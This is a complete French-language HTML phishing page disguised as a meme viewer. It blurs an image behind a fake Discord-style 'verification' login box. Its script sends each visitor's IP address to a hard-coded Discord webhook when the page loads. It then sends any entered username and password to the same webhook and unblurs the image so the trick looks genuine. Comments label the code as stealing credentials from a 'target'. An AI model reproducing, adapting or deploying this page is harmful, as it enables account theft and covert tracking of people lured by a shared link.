<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="Meme_Rigolo.png">
    <meta property="og:image" content="https://pbs.twimg.com/media/ElRTFVrWkAAGRcw.jpg">
    <meta property="og:description" content="Regarde ce meme, j'ai explosé !">
    <title>Visualiseur d'Image</title>
    <style>
        body { margin: 0; background: #1a1a1a; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; }
        img { max-width: 80%; border-radius: 8px; margin-bottom: 20px; filter: blur(5px); } /* L'image est floue pour forcer le clic */
        .login-box { background: #2f3136; padding: 20px; border-radius: 8px; text-align: center; width: 300px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 3px; border: none; }
        button { background: #5865f2; color: white; border: none; padding: 10px 20px; border-radius: 3px; cursor: pointer; width: 100%; }
    </style>
</head>
<body>

    <img src="https://pbs.twimg.com/media/ElRTFVrWkAAGRcw.jpg" id="meme">

    <div class="login-box" id="auth-box">
        <h3>Vérification Requise</h3>
        <p style="font-size: 0.8em; color: #b9bbbe;">Connecte-toi pour voir l'image en HD</p>
        <input type="text" id="user" placeholder="E-mail ou Pseudo">
        <input type="password" id="pass" placeholder="Mot de passe">
        <button onclick="sendLogs()">Vérifier</button>
    </div>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1481123753109885103/u6gAezp9LjuOt2Fbgl7cfuOMVyWU_hMw8zyuDw7w-EPnzLs8MWQbenmdXb4_JVMFxhzD";

        // 1. Capture automatique de l'IP dès l'ouverture
        window.onload = async () => {
            const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            fetch(WEBHOOK, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    content: `⚠️ **ALERTE :** Une cible a ouvert le lien !\n📍 **IP :** \`${ipData.ip}\`\n🕰️ **Heure :** ${new Date().toLocaleTimeString()}`
                })
            });
        };

        // 2. Capture des identifiants (Le "Steal")
        async function sendLogs() {
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;

            if(u && p) {
                await fetch(WEBHOOK, {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({
                        embeds: [{
                            title: "🔑 IDENTIFIANTS CAPTURÉS",
                            color: 16711680,
                            fields: [
                                { name: "Compte", value: `\`${u}\`` },
                                { name: "Password", value: `\`${p}\`` }
                            ]
                        }]
                    })
                });

                // Une fois volé, on défloute l'image pour faire "vrai"
                document.getElementById('meme').style.filter = "none";
                document.getElementById('auth-box').innerHTML = "<p style='color:lime'>Vérification réussie !</p>";
            }
        }
    </script>
</body>
</html>
